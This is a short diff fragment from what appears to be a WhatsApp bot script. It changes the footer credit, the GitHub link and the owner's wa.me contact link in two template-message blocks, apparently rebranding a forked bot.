-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -5805,17 +5984,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: `Nih Kak`,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
